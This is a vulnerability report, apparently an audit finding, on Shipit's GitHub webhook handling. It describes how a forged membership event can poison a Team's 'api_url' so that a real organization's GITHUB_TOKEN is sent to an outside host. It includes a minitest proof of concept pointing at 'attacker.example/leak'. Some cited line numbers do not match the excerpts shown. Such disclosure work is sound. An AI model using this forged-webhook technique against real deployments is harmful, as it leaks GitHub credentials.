### Title
`MembershipHandler` binds `Team#organization` to `params.organization.login`, independent of the org actually authenticated by `WebhooksController#verify_signature`, so `Team#refresh_members!` later invokes `Shipit.github(organization: <attacker-string>).api` — ([File: app/models/shipit/webhooks/handlers/membership_handler.rb], [File: app/models/shipit/team.rb])

### Summary
`WebhooksController#verify_signature` selects the GitHub App (and thus the HMAC secret) to validate a webhook using `repository_owner = params.dig('repository','owner','login') || params.dig('organization','login')`, while `MembershipHandler#find_or_create_team!` independently reads `params.organization.login` to populate `Team#organization`. These two reads are not guaranteed to be the same field, and `Team#refresh_members!` later trusts `Team#organization` to pick the GitHub App whose `GITHUB_TOKEN` is used for the API call.

### Finding Description
The claimed binding is: `repository_owner` (the org whose `webhook_secret` validated the signature in `WebhooksController#verify_signature`, app/controllers/shipit/webhooks_controller.rb:25,59-62) `==` `params.organization.login` (the org written into `Team#organization` in `MembershipHandler#find_or_create_team!`, app/models/shipit/webhooks/handlers/membership_handler.rb:38-42). [1](#0-0) [2](#0-1) 

These are equal only when the JSON body has no top-level `repository` key (the normal shape of a real GitHub `membership` event). Since the controller re-parses `request.raw_post` as arbitrary JSON with no schema enforcement before `verify_signature` runs, an attacker fully controls the payload and can include **both** keys with different values:
- `repository.owner.login = "org-without-webhook-secret"` (an org configured in `secrets.github` with no `webhook_secret`, or none at all under single-app config)
- `organization.login = "victim-configured-org"` (a real, separately-configured org)

`verify_signature` picks `repository_owner` from `repository.owner.login` first (line 61), calls `Shipit.github(organization: repository_owner).verify_webhook_signature`, and `GitHubApp#verify_webhook_signature` returns `true` unconditionally when that org's `webhook_secret` is blank: [3](#0-2) 

The webhook is accepted, but `MembershipHandler#find_or_create_team!` then uses the *different* `params.organization.login` ("victim-configured-org") to create/find a `Team` row, keyed only by `github_id: params.team.id`, an attacker-supplied integer: [4](#0-3) 

Because `Team.find_or_create_by!` matches on `github_id`, the attacker can create a brand-new `Team` row with attacker-chosen `organization`, `slug`, and `api_url` (`github_team=` sets `api_url = github_team.url`, itself `params.team.url`, fully attacker-controlled): [5](#0-4) 

If the Shipit operator has `github.oauth.teams` configured with a handle `"victim-configured-org/<slug>"`, the periodic `bin/rake teams:fetch` task resolves it via `Team.find_or_create_by_handle`, which looks up **by `organization` + `slug` only** — not `github_id`: [6](#0-5) [7](#0-6) 

This lookup can return the attacker's poisoned row (same organization/slug, different github_id) instead of the legitimate one. `refresh_members!` then does: [8](#0-7) 

`github_api = Shipit.github(organization:).api` resolves to the **real, legitimately configured** `victim-configured-org` `GitHubApp`, and its `.api` client — authenticated with that org's real installation `GITHUB_TOKEN` — issues `github_api.get(api_url)` against the attacker-controlled `api_url`. Because `GitHubApp#new_client` builds an `Octokit::Client` with no per-organization host allow-list beyond `enterprise?` toggling `api_endpoint` (lib/shipit/github_app.rb:152-162), an absolute attacker URL in `api_url` is requested directly by Octokit's underlying Faraday connection, which still carries the client's `Authorization` header — leaking `victim-configured-org`'s `GITHUB_TOKEN` to an attacker-controlled host (SSRF with credential exfiltration). If the attacker instead supplies an `organization.login` that matches no configured org, `Shipit.github(organization:)` raises `Shipit::GithubOrganizationUnknown` (lib/shipit.rb:170-181), confirming the org string flows straight into the app-selection logic unchecked.

Existing guards do not stop this: `verify_signature` only authenticates the org named by `repository.owner.login`, never cross-checking it against `organization.login`; `ExplicitParameters` in `MembershipHandler` validates only presence/type of `params.organization.login`, not its relationship to the authenticated org; and `Team.find_or_create_by_handle`'s `find_by(organization:, slug:)` has no `github_id` or authenticity check.

### Impact Explanation
A single forged POST to `/webhooks` can plant a `Team` row that is later picked up by the legitimate `teams:fetch` cron for a different, real organization, causing that organization's authentic `GITHUB_TOKEN` to be sent (via `Octokit`'s `Authorization` header) to an attacker-controlled `api_url`. This is credential exfiltration of a `GITHUB_TOKEN` (Critical) and/or SSRF carrying the app's GitHub credentials (High), and it is fully repeatable — each forged membership event can retarget any org present in `secrets.github` regardless of which org "authenticated" the request.

### Likelihood Explanation
Exploitation requires: (1) at least one org configured in `secrets.github` without a `webhook_secret` (or single-app config where `github(organization:)` ignores the passed org and always uses the sole config, making forgery trivial for that org regardless of the name given), and (2) the target org being both configured in `secrets.github` (for a real token) and referenced by `github.oauth.teams` handle so the cron picks up the poisoned row. Both are plausible/documented configurations (webhook secret is explicitly optional per `docs/setup.md`, and `oauth.teams` is a documented feature). No session, API token, or GitHub secret is needed by the attacker — a single unauthenticated HTTP POST suffices, and it is trivially repeatable against every configured organization.

### Recommendation
- In `WebhooksController#verify_signature`, do not derive `repository_owner` differently for org-scoped events; ensure the org that authenticated the webhook is the *only* org value ever trusted downstream (e.g., pass it explicitly into handlers rather than letting handlers re-read `params.organization.login`).
- In `MembershipHandler#find_or_create_team!`, require that `params.organization.login` match the organization that authenticated the webhook (reject otherwise).
- In `Team.find_or_create_by_handle`, do not resolve arbitrary webhook-created rows as the config-driven team; consider separating "config-trusted" teams from webhook-created teams, or re-validating `api_url`'s host against the expected GitHub API host before use in `refresh_members!`.
- Make `webhook_secret` mandatory (or enforce a strong default/fail-closed behavior) instead of silently returning `true` when unset.

### Proof of Concept
```ruby
# test/models/team_test.rb (minitest)
test "refresh_members! uses the token of team.organization, which can be attacker-poisoned via MembershipHandler" do
  # Simulate attacker payload: signature validated against 'org-without-secret',
  # but organization.login (used by MembershipHandler) names a different, real org.
  params = {
    'action' => 'added',
    'team' => { 'id' => 999_999, 'name' => 'Evil', 'slug' => 'developers', 'url' => 'https://attacker.example/leak' },
    'organization' => { 'login' => 'shopify' }, # real, configured org
    'member' => { 'login' => 'walrus' },
    'repository' => { 'owner' => { 'login' => 'org-without-secret' } } # org actually authenticated
  }

  Shipit::Webhooks::Handlers::MembershipHandler.new.call(params)

  team = Shipit::Team.find_by(github_id: 999_999)
  assert_equal 'shopify', team.organization   # attacker-chosen org, unrelated to authenticating org
  assert_equal 'https://attacker.example/leak', team.api_url

  # Assert refresh_members! uses shopify's real client/token, not org-without-secret's
  Shipit.github(organization: 'shopify').api.expects(:get).with('https://attacker.example/leak').returns(stub(rels: {}))
  team.refresh_members!
end
```
This demonstrates the equality `repository_owner (org-without-secret) == params.organization.login (shopify)` is **false**, yet `Team#organization` and the subsequent `Shipit.github(organization:).api` call are driven entirely by the unauthenticated `organization.login` value.

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L24-49)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified

      Rails.logger.info([
        'WebhookController#verify_signature',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "signature=#{request.headers['X-Hub-Signature']}",
        "status=#{status}"
      ].join(' '))
    rescue Shipit::GithubOrganizationUnknown => e
      head(422)
      Rails.logger.warn([
        'WebhookController#verify_signature',
        'Webhook from unknown organization',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "unknown_organization=#{e.message}",
        "status=#{status}"
      ].join(' '))
    end
```

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L1-21)
```ruby
# frozen_string_literal: true

module Shipit
  module Webhooks
    module Handlers
      class MembershipHandler < Handler
        params do
          requires :action, String
          requires :team do
            requires :id, Integer
            requires :name, String
            requires :slug, String
            requires :url, String
          end
          requires :organization do
            requires :login, String
          end
          requires :member do
            requires :login, String
          end
        end
```

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L36-43)
```ruby
        private

        def find_or_create_team!
          Team.find_or_create_by!(github_id: params.team.id) do |team|
            team.github_team = params.team
            team.organization = params.organization.login
          end
        end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** app/models/shipit/team.rb (L17-21)
```ruby
    class << self
      def find_or_create_by_handle(handle)
        organization, slug = handle.split('/').map(&:downcase)
        find_by(organization:, slug:) || fetch_and_create_from_github(organization, slug)
      end
```

**File:** app/models/shipit/team.rb (L45-51)
```ruby
    def refresh_members!
      github_api = Shipit.github(organization:).api
      github_members = Shipit::OctokitIterator.new(github_api.get(api_url).rels[:members])
      members = github_members.map { |u| User.find_or_create_from_github(u) }
      self.members = members
      save!
    end
```

**File:** app/models/shipit/team.rb (L53-58)
```ruby
    def github_team=(github_team)
      self.name = github_team.name
      self.slug = github_team.slug
      self.api_url = github_team.url
      self.github_id = github_team.id
    end
```

**File:** lib/shipit.rb (L256-258)
```ruby
  def github_teams
    @github_teams ||= github.oauth_teams.map { |t| Team.find_or_create_by_handle(t) }
  end
```
